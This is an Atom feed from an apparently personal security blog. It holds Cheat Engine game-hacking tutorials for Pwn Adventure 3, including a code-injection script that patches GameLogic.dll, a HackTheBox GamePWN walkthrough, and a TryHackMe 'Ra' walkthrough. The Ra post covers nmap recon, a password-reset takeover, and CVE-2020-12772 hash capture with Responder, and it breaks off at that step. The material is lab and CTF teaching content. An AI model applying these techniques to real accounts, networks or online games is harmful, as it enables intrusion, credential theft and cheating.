<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-15T18:36:07+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rahul R</title><subtitle>Personal blog where I will be posting about security,CTFs and more</subtitle><author><name>Rahul R</name></author><entry><title type="html">Breaking Pwn Adventure 3 - Part 2(Speed Hack, SuperJump and Pointers Offline Mode)</title><link href="http://localhost:4000/Breaking-PWNAdventure3-Part2/" rel="alternate" type="text/html" title="Breaking Pwn Adventure 3 - Part 2(Speed Hack, SuperJump and Pointers Offline Mode)" /><published>2022-04-15T00:00:00+05:30</published><updated>2022-04-15T00:00:00+05:30</updated><id>http://localhost:4000/Breaking-PWNAdventure3-Part2</id><content type="html" xml:base="http://localhost:4000/Breaking-PWNAdventure3-Part2/">&lt;p&gt;In this part I will be explaining how to increase out player speed and our jump velocity  and finding pointers to these values to be persistant.&lt;/p&gt;

&lt;h1 id=&quot;speed-hack--super-jump&quot;&gt;Speed Hack &amp;amp; Super Jump&lt;/h1&gt;
&lt;p&gt;We can start by attaching our game to cheat engine and scaning for the health value of the player.
&lt;img src=&quot;/assets/images/pwnadventure/partII/scan1.PNG&quot; alt=&quot;&quot; /&gt;
We have our health address and now we can  find what instruction writes to this address when we get damaged by an enemy for that we need to right click on the address and select &lt;strong&gt;Find out what writes to this address&lt;/strong&gt; or press &lt;strong&gt;F6&lt;/strong&gt; a small window will be shown and it will be populated once we start getting damage.
&lt;img src=&quot;/assets/images/pwnadventure/partII/writes2.PNG&quot; alt=&quot;&quot; /&gt;
The instruction excecuted when getting damage is &lt;strong&gt;sub [edi+30],eax&lt;/strong&gt; so the address in EDI is the base address of the player and offset 30 is the place where our player’s health is stored. We can now click on that instruction to get more information and grab the address of EDI.
&lt;img src=&quot;/assets/images/pwnadventure/partII/healthEDI.PNG&quot; alt=&quot;&quot; /&gt;
In my case my EDI address is 0x4EC76D78 no we can use this address to view the structure related with the player for that we need to go to the disassembler and click the tools  and select Dissect Data Structure.
&lt;img src=&quot;/assets/images/pwnadventure/partII/datastructure.PNG&quot; alt=&quot;&quot; /&gt;
Normally in games the player or the enemy object’s data such as health,position,names are stored in structures with an offset so each time the tries to access some for example the player’s health all the game needs is the player’s base address and incrementing these offsets will reach the player’s health value.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;During Dissect Data Structure the base address should be used&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now we can add our players base address in the box labeled Group 1 and then click on structures and then Define a new structure.
&lt;img src=&quot;/assets/images/pwnadventure/partII/datastructure1.PNG&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/images/pwnadventure/partII/datastructure2.PNG&quot; alt=&quot;&quot; /&gt;
We can verify this by going to offset 30 which contains our player’s health value.Generally variables such as speed are defined in the program as a constant value.
Since this is the player structure the speed value has to be stored somewhere in this sturcture we can find it by moving down the structre and finding whole values such as 100 ,500.450 etc and changing it to a much higher value.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;This is not an efficent method as there are chances for our game to crash if we change a wrong structure value.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At offset 190 there is a value of 200 we can add it to our address list and change it to a higher value and try moving in game.&lt;/p&gt;
&lt;figure class=&quot;video_container&quot;&gt;
  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
    &lt;source src=&quot;/assets/images/pwnadventure/partII/speed.mp4&quot; type=&quot;video/mp4&quot; /&gt;
  &lt;/video&gt;
&lt;/figure&gt;
&lt;p&gt;As we can see our player’s movement speed increased and we are zooming across the map.&lt;/p&gt;

&lt;p&gt;For superjump we use the same method to find the offset where our jump velocity is stored in this game its stored right next to the player’s speed at offset 194 the default value is set to 420.Lets change it to a higher amount and try to jump.
&lt;img src=&quot;/assets/images/pwnadventure/partII/jump.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;figure class=&quot;video_container&quot;&gt;
  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot;&gt;
    &lt;source src=&quot;/assets/images/pwnadventure/partII/jump.mp4&quot; type=&quot;video/mp4&quot; /&gt;
  &lt;/video&gt;
&lt;/figure&gt;
&lt;p&gt;Changing it to a higher value has made our player to jump much higher but there is one issue unlike the Gode Mode hack that was made in previous part this is not persistant which means that if we close the game this memory address will become invalid due to &lt;a href=&quot;https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR&quot;&gt;ASLR&lt;/a&gt; thats where pointers come in rescue.&lt;/p&gt;

&lt;h1 id=&quot;pointers&quot;&gt;Pointers&lt;/h1&gt;
&lt;p&gt;Due to ASLR when a game restarts the previous addresses that were used will become invalid in order for the game to find the correct address pointers are used some games use single level pointers which means only one offset will be present.
Some games use multilevel pointers where there might be 5 or 6 levels of offsets.
&lt;a href=&quot;https://guidedhacking.com/threads/understanding-pointers-how-to-find-pointers.14502/&quot;&gt;Guided hacking&lt;/a&gt; and &lt;a href=&quot;https://www.youtube.com/watch?v=elI6vZR6HGE&quot;&gt;LiveOverflow&lt;/a&gt; has made an incredible set of videos that tells about pointers and why this is used in development.&lt;/p&gt;

&lt;p&gt;We can now start by doing a pointer scan on the player’s speed value by right clicking the value and selecting &lt;strong&gt;pointer scan for this address&lt;/strong&gt; and continue which will give out a list of pointers that points to our player speed address normally we can use this method but for this game even though we get pointers that will be invalid when we restart the game since all the logic is tied to the GameLogic.dll file for that we need to find the starting and ending address of the DLL and restrict our pointer scan within that address space for that we can go to the dissassembler and click on view then Memory Regions which will give a list of addresses that the game uses scrolling down we need to find the address where our GameLogic.dll is being loaded to memory.
&lt;img src=&quot;/assets/images/pwnadventure/partII/memory.PNG&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/images/pwnadventure/partII/memory1.PNG&quot; alt=&quot;&quot; /&gt;
We can see that the GameLogic.dll file is loaded at address 67E90000 so we can use this information to restrict our pointer scan.
&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer.PNG&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer1.PNG&quot; alt=&quot;&quot; /&gt;
This will scan for pointers to our player’s speed value within the DLL’s address space.
&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer2.PNG&quot; alt=&quot;&quot; /&gt;
The pointer scan result shows more that 5000 potential pointer paths to verify this we just have to restart the game and attach it to cheat engine.
&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer3.PNG&quot; alt=&quot;&quot; /&gt;
Reattaching the game to cheat engine and checking the pointer scan result we can see that the values are all gone since the previous address is no longer available we can now rescan this pointer map for the value of 200 and see if we have some valid pointers.
&lt;img src=&quot;/assets/images/pwnadventure/partII/pointer4.PNG&quot; alt=&quot;&quot; /&gt;
Since we have restarted the game we need to find the player speed address again and copy the address and use that address to rescan for pointers by repeating this process we eventually end up in a pointer path that is valid.
&lt;img src=&quot;/assets/images/pwnadventure/partII/cheattable.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The cheat engine cheat table is available in my &lt;a href=&quot;https://github.com/rahulr311295/GameTrainers/blob/main/PwnAdventure3/CheatTable/PwnAdventure3.CT&quot;&gt;github&lt;/a&gt; if anyone wishes to try out.&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="reverse-engineering" /><category term="gamehacking" /><category term="cheatengine" /><summary type="html">Creating Speed Hack and Super Jump on Pwn Adventure 3 using Cheat Engine</summary></entry><entry><title type="html">Breaking Pwn Adventure 3 - Part 1(God Mode + One Hit Kills Offline Mode)</title><link href="http://localhost:4000/Breaking-PWNAdventure3-Part1/" rel="alternate" type="text/html" title="Breaking Pwn Adventure 3 - Part 1(God Mode + One Hit Kills Offline Mode)" /><published>2022-04-09T00:00:00+05:30</published><updated>2022-04-09T00:00:00+05:30</updated><id>http://localhost:4000/Breaking-PWNAdventure3-Part1</id><content type="html" xml:base="http://localhost:4000/Breaking-PWNAdventure3-Part1/"># Prologue
![](/assets/images/pwnadventure/logo.png)

&gt; Readers can ignore this if required

Ever since the awesome [LiveOverflow](https://twitter.com/LiveOverflow) released his game hacking [playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjzzBeFSHXrw9DnQtssdAwgG). I always wanted to try it out myself figuring out how things worked eventhough I have zero skill in reading assembly, reverse engineering or even writing code.

Game Hacking is no easy job it requires time , many hours of trial and error , crashing and I have to admire the efforts put by LiveOverflow in creating his Game Hacking series. I had my fare share of Game Hacking in my teen years which was the first time I used [Cheat Engine](https://www.cheatengine.org/) to change the current amount of in game money that I had in GTA Vice City. I&apos;ve only used it once without knowing the potential that tool had

Since  I consider this as a learning experience I thought of posting my journey here as a journal.

# God Mode and One Hit Kills
To start our hacks we need to attach the game process by opening Cheat Engine and attaching the game.
![](/assets/images/pwnadventure/partI/processattach.PNG)

Next we need to confirm what value we need to find in this case Im going after the Health Value.For that lets start a scan by setting the Scan Type to **Exact Value** and the Value Type as **4 Bytes** since the Health value is an interger and start a new scan.
&gt;Note : Some games also use float value type for Health , Ammo etc

![](/assets/images/pwnadventure/partI/scan1.PNG)

We have around 10K value we can futher refine by getting some damage from the enemies.

![](/assets/images/pwnadventure/partI/damage1.PNG)

Now our health has been reduced to 92 we can use that value to do the next scan.
![](/assets/images/pwnadventure/partI/scan1.PNG)
We have now 43 potential memory addresses that has our health value all 43 of the address will change we can isolate the correct address by add all 43 of the memory addresses to our address list and freezing a couple of the address and taking damage.
![](/assets/images/pwnadventure/partI/freeze.gif)
We can see that our health keeps going back to 100 everytime we get damage we can further verify this by changing the value to something high.
![](/assets/images/pwnadventure/partI/freeze.PNG)
By selecting 3 of the address and changing the value to 1337 the first and the last value changed so one of these address is the address that stores our health.We can  now isolate those 2 memory address and change the value one by one until we find the right address.

To implement God Mode we need to find what instruction writes to this address when we get damaged by an enemy for that we need to right click on the address and select **Find out what writes to this address** or press **F6** a small window will be shown and it will be populated once we start getting damage.

![](/assets/images/pwnadventure/partI/writestoaddress.PNG)

We can now take damage from an enemy and our empty box gets filled with an instruction **sub [edi+30],eax**
![](/assets/images/pwnadventure/partI/writestoaddress1.PNG)
We can now investigate what are the values stored in the register by clicking on it and looking in the bottom window.
![](/assets/images/pwnadventure/partI/writestoaddress2.PNG)

So the register EAX containes the value 8 which is the damage done by the Giant Rats on a single hit which is then subtracted from value stored in EDI + 30 where EDI is the base address and 30 is an offset.
Since our goal is to acheive God Mode we could just NOP out this instruction so that when ever we get hit our health wont be subtracted.
We can do that by click the **Show disassembler** button which will show a disassembler similar to OllyDBG or Immunity Debugger.

We can now right click on the sub instruction and click on **Replace with code that does nothing** which will replace the SUB instruction with NOPs.
![](/assets/images/pwnadventure/partI/nop.PNG)

![](/assets/images/pwnadventure/partI/nop1.PNG)

Now we have nopped the instrustion we can check it by getting some damage from an enemy.
![](/assets/images/pwnadventure/partI/nop2.gif)
Our health is not changing but there is one issue if we shoot an enemy with our fireball the enemy doesnot take damage as well.
![](/assets/images/pwnadventure/partI/nop3.gif)
This is due to some thing called [**Shared OP Codes**](https://guidedhacking.com/threads/cheat-engine-shared-opcode-tutorial-gh203.18815/) which means that the instruction  **sub [edi+30],eax** is shared with our player and enemies so if we change these OP Codes it will reflect on both the player and the enemy, So we need to find a value or an offset that can be used to create a comparison between our player and the enemies.
&gt;Dont forget to restore the nopped instruction 

Fo that we need to right click on the **sub [edi+30],eax** from what writes to this address box and click on **Find out what addresses this code accesses** which will bing a second window.
![](/assets/images/pwnadventure/partI/pVeaccess.PNG)
![](/assets/images/pwnadventure/partI/pVeaccess1.PNG)
Now we need to take a hit from an enemy and give a hit to a couple of the enemies as well.
![](/assets/images/pwnadventure/partI/pVeaccess2.gif)
We can see that we have some entries when we get hit and give out damage we can select a couple of these values and right click and select **Open disect data with selected addesses**.
![](/assets/images/pwnadventure/partI/pVedisect.PNG)

Which brings another window with our addresses we need to create a group for our enemies for comparison
&lt;figure class=&quot;video_container&quot;&gt;
  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot; &gt;
    &lt;source src=&quot;/assets/images/pwnadventure/partI/pVesturct.mp4&quot; type=&quot;video/mp4&quot;&gt;
  &lt;/video&gt;
&lt;/figure&gt;
In this sturcture we can check for a certain value that differs the player from other characters that wont be changed during the entire game the items in orange shows entries that are different in both groups in this case the offset 14 contains the name of the Actor.
![](/assets/images/pwnadventure/partI/pVesturct.PNG)

We can  use this offset to create a comparrison much like an if statement so that our cheat only affects on the enemie&apos;s health.
Lets begin our cheat development by going back to the disassembler and selecting the SUB instruction and clicking on the Tools menu and then selecting the Auto Assemble option. 
There are multiple ways we can inject custom code to a game&apos;s process I&apos;ve used code injection method for creating this cheat.
![](/assets/images/pwnadventure/partI/inject.PNG)
A new editable window will be displayed where we can select the method of injection from the templates menu.
![](/assets/images/pwnadventure/partI/inject1.PNG)
All our custom code should be kept inside the newmem section. Now we can start by doing a comparison for our God Mode.

```
[ENABLE]
//code from here to &apos;[DISABLE]&apos; will be used to enable the cheat
alloc(newmem,2048)
label(returnhere)
label(originalcode)
label(exit)

newmem: //this is allocated memory, you have read,write,execute access

cmp  dword ptr [edi+14],&apos;Player&apos; // Compares if the value in EDI+14 is the string player since EDI is our player&apos;s base address.

jne originalcode //if its not player move to original code

sub [edi+30],0 //If offset value is equal to player subtract 0 from health

push [edi+30] 

jmp exit // Above operations done exiting from this execution flow This should be done else our code starts going into original code and sets our health to 0 as well if we get hit from an enemy

originalcode:
mov [edi+30],0 // Move 0 to Total Health (Only affects Enemies)
push [edi+30]

exit:
jmp returnhere

&quot;GameLogic.dll&quot;+20C5:
jmp newmem
nop
returnhere:

 
[DISABLE]
//code from here till the end of the code will be used to disable the cheat
dealloc(newmem)
&quot;GameLogic.dll&quot;+20C5:
sub [edi+30],eax
push [edi+30]
//Alt: db 29 47 30 FF 77 30
```
Lets now assign this cheat to our cheat table by going to File and selecting the assign to cheat table.
![](/assets/images/pwnadventure/partI/cheat.PNG)
Now we can test our cheat see weather we are taking in damage and killing enemies in one hit.
&lt;figure class=&quot;video_container&quot;&gt;
  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot; &gt;
    &lt;source src=&quot;/assets/images/pwnadventure/partI/godmode.mp4&quot; type=&quot;video/mp4&quot;&gt;
  &lt;/video&gt;
&lt;/figure&gt;
Lets try it out on a Boss and see if this cheat works or not for that lets go to Magmarok and try killing him in one hit.
&lt;figure class=&quot;video_container&quot;&gt;
  &lt;video controls=&quot;true&quot; allowfullscreen=&quot;true&quot; &gt;
    &lt;source src=&quot;/assets/images/pwnadventure/partI/boss.mp4&quot; type=&quot;video/mp4&quot;&gt;
  &lt;/video&gt;
&lt;/figure&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="reverse-engineering" /><category term="gamehacking" /><category term="cheatengine" /><summary type="html">Creating God Mode and One Hit Kills on Pwn Adventure 3 using Cheat Engine</summary></entry><entry><title type="html">Hackthebox GamePWN CubeMadness1</title><link href="http://localhost:4000/HackTheBox-GamePWN/" rel="alternate" type="text/html" title="Hackthebox GamePWN CubeMadness1" /><published>2022-04-04T00:00:00+05:30</published><updated>2022-04-04T00:00:00+05:30</updated><id>http://localhost:4000/HackTheBox-GamePWN</id><content type="html" xml:base="http://localhost:4000/HackTheBox-GamePWN/">While searching through hackthebox I came across a new challenge category called GamePWN which was related to game hacking so I thought why don&apos;t I give it a try on something new.
So I downloaded the zip file and extracted it which contained the game binary which was developed in Unity Engine.

![](/assets/images/gamepwn-cubemadness/files.png)

Most unity games are developed with C# which can be de-compiled directly using [dnSpy](https://github.com/dnSpy/dnSpy) by dropping the executable or the GameAssembly.dll file,But in this case the game assembly was actually build with [il2cpp](https://docs.unity3d.com/Manual/IL2CPP.html) which converts C# code to C++ which is actually used by developers to stop reverse engineering and leaking their game&apos;s source code.

![](/assets/images/gamepwn-cubemadness/dnspy.png)

There are tools such as [Il2CppInspector](https://github.com/djkaty/Il2CppInspector) and [Il2CppDumper](https://github.com/Perfare/Il2CppDumper) that can be used to convert the DLL to a somewhat readable form.
But this challenge wont require such drastic measures all we need is good old [CheatEngine](https://www.cheatengine.org/) which is an OP tool used by game hackers or reverse engineers to edit game memory on the fly.
Our end goal of this challenge is to collect 20 cubes inorder to win but the game only has 6 cubes 

![](/assets/images/gamepwn-cubemadness/teaser.png)

So we need to change the current value of our collected cubes to 20 inorder to read the flag for that we need to start the game and then attach the game&apos;s process to CheatEngine.

![](/assets/images/gamepwn-cubemadness/cheatengine.png)

Now we have attached our game&apos;s process to CheatEngine, Now we need to find the memory address where the current score is stored.

![](/assets/images/gamepwn-cubemadness/cheatengine1.png)

Usually in the development phase of a game values such as Health,Ammo,XP,Score are stored in 4 byte integer values so we can start our initial scan by setting the Scan Type to Exact Values and the Value Type as 4 Bytes and search for the value 0 which is our current score.

![](/assets/images/gamepwn-cubemadness/cheatengine2.png)

As we can see in the above image we have a huge list of addresses where our initial value is zero we can now narrow it down by collecting a single cube in the game and then changing the Scan Type to Increased By and setting the value as 1 since we collected a cube and clicking the Next Scan button.

![](/assets/images/gamepwn-cubemadness/cheatengine3.png)

Now our address values have dropped down to around 37 thousand we can use the same method to further filter the memory addresses.

![](/assets/images/gamepwn-cubemadness/cheatengine4.png)

Now our address values have dropped even more to just 3 thousand occurances.

![](/assets/images/gamepwn-cubemadness/cheatengine5.png)

Generally in a game there are certain memory locations that keeps changing every tick(seconds) we can filter that out by changing the Scan Type to Unchanged Values.

![](/assets/images/gamepwn-cubemadness/cheatengine6.png)

By following the same method by collecting a couple of cubes and then using that value to do an increased by value scan we will end up with 3 or 4 memory addresses.

![](/assets/images/gamepwn-cubemadness/cheatengine7.png)

We can now double click on those memory addresses which will be added to our address list below.

![](/assets/images/gamepwn-cubemadness/cheatengine8.png)

Now we can select the memory addresses one by one and change the value to check weather it is the correct memory address.

![](/assets/images/gamepwn-cubemadness/cheatengine.gif)

We can see that we have found the memory address where the score is being stored now we can read the flag by changing the score to 20 or above.

![](/assets/images/gamepwn-cubemadness/win.png)


**Also I will be posting more on GameHacking in this website most of them will be offline hacks and some online hacks such as ESP and AimBots.**</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="hackthebox" /><category term="gamehacking" /><category term="cheatengine" /><summary type="html">This is the walkthrough for the newly introduced challenge category GamePWN on HackTheBox</summary></entry><entry><title type="html">Tryhackme Ra Walkthrough</title><link href="http://localhost:4000/Ra-Tryhackme-Walkthrough/" rel="alternate" type="text/html" title="Tryhackme Ra Walkthrough" /><published>2022-02-11T00:00:00+05:30</published><updated>2022-02-11T00:00:00+05:30</updated><id>http://localhost:4000/Ra-Tryhackme-Walkthrough</id><content type="html" xml:base="http://localhost:4000/Ra-Tryhackme-Walkthrough/">## Story
```
You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).

Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?

Happy Hacking!
```
## Nmap
A Nmap  full scan shows multiple open ports running different services one of then that stands out is port **80** which is a webserver also in the nmap output there is a domain name which can be added to out hosts file.
```bash
# Nmap 7.92 scan initiated Sun Feb  6 11:21:06 2022 as: nmap -sC -sV -Pn -p- -oN initial 10.10.85.15
Nmap scan report for 10.10.85.15
Host is up (0.21s latency).
Not shown: 65499 filtered tcp ports (no-response)
PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
80/tcp    open  http                Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-02-06 06:10:15Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
|_ssl-date: 2022-02-06T06:12:05+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-06T06:11:27+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2022-02-05T05:45:30
|_Not valid after:  2022-08-07T05:45:30
5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     stream_id: 6q1pw8isix
|_    compression_methods: 
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2022-02-06T06:12:06+00:00; 0s from scanner time.
5223/tcp  open  ssl/jabber
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2022-02-06T06:12:05+00:00; 0s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|_    compression_methods: 
5229/tcp  open  jaxflow?
5262/tcp  open  jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     stream_id: 7kayxe2awz
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
5263/tcp  open  ssl/jabber
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2022-02-06T06:12:05+00:00; 0s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|_    compression_methods: 
| fingerprint-strings: 
|   RPCCheck: 
|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|_    compression_methods: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_ssl-date: 2022-02-06T06:12:06+00:00; 0s from scanner time.
5275/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|       version: 1.0
|     stream_id: 6p72sw8xd
|_    compression_methods: 
5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: 2022-02-06T06:12:05+00:00; 0s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       (timeout)
|     features: 
|     auth_mechanisms: 
|     unknown: 
|     xmpp: 
|_    compression_methods: 
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
|_http-title: Openfire HTTP Binding Service
|_http-server-header: Jetty(9.4.18.v20190429)
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?
9091/tcp  open  ssl/xmltec-xmlmail?
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
9389/tcp  open  mc-nmf              .NET Message Framing
49670/tcp open  msrpc               Microsoft Windows RPC
49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc               Microsoft Windows RPC
49676/tcp open  msrpc               Microsoft Windows RPC
49695/tcp open  msrpc               Microsoft Windows RPC
49911/tcp open  msrpc               Microsoft Windows RPC
6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

Host script results:
| smb2-time: 
|   date: 2022-02-06T06:11:30
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  6 11:42:19 2022 -- 1 IP address (1 host up) scanned in 1272.50 seconds

```

## Port 80 (webserver)
Visiting the webserver shows a static website for  **windcorp** which contains information regaring the company the employees etc also in the website there is something that stands out a space that shows IT support people who are online at the moment which will be used in a later stage.

**Webpage**
![](/assets/images/ra/webpage.png)

**Currently online IT staff**
![](/assets/images/ra/itstaffs.png)

**Employees**
![](/assets/images/ra/users.png)

Also in the webpage there is a button to reset password for users which askes a secutity question which is required to change the password.One of the sercurity question is &quot;**What is/was your favourite pets name ?**&quot;.

![](/assets/images/ra/resetpass.png)

In the employee section there is only one user who has a dog that is Lily.Opening the image the URI leaks the username and the dog&apos;s name which can be used to reset the password and compramise the account.

**Potential username and security question&apos;s answer**
![](/assets/images/ra/lily.png)

![](/assets/images/ra/resetpass1.png)

On submitting the request  a new password will be generated and displayed.

![](/assets/images/ra/newpass.png)

Using this credential we can check weather we have smb access or winrm access using crackmapexec.

**Checking SMB access**
![](/assets/images/ra/lilsmbtest.png)

**Checking WINRM access**
![](/assets/images/ra/lilwinrmtest.png)

By using this credential we can use crackmapexec and smbclient to connect to the SMB server and see what shares and files are there.

**Crackmapexec SMB shares**
![](/assets/images/ra/lilsmbshares.png)

From the above output there are two shares that are not default .

**Smbclient**

![](/assets/images/ra/lilsmbclient.png)

In the shared folder there are installation files for Spark a live chat application and also the first flag for the machine.The version of spark provided in the share is vulnerable to [CVE-2020-12772](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md).To exploit this vulnerability we need to install spark on our local machine and since spark uses windows authentication we can use the credentials of the already compramised user to login.

**Spark login screen**

![](/assets/images/ra/spark1.png)

Upon loggin in there is an error due certificate issue which can be bypass by going to the advanced option and enabling the not to verify cetificate toggle

![](/assets/images/ra/spark2.png)
![](/assets/images/ra/spark3.png)

Now we can send the exploit payload to buse as he is the only IT staff member that is currently online and mean while start responder to capure incoming NTLM hashes.

![](/assets/images/ra/spark4.png)

**Responder to capture hashes**
